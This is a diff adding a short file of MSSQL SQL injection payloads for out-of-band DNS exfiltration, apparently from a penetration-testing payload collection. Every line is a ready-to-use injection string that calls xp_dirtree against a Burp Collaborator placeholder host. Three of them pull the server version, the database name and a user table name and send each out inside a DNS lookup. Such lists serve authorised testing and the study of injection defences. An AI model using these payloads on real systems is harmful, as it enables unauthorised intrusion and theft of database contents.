@@ -1,0 +1,12 @@
+# MSSQL — Out-of-Band (OOB) / DNS exfiltration
+# Uses xp_dirtree (master extended procedure)
+# Use Burp Collaborator or interactsh for listener
+
+# --- DNS lookup via xp_dirtree ---
+'; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
+'; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'; --
+
+# --- DNS exfiltration with data ---
+'; DECLARE @p VARCHAR(1024); SET @p=(SELECT @@version); EXEC('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"')--
+'; DECLARE @p VARCHAR(1024); SET @p=(SELECT db_name()); EXEC('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"')--
+'; DECLARE @p VARCHAR(1024); SET @p=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'); EXEC('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"')--
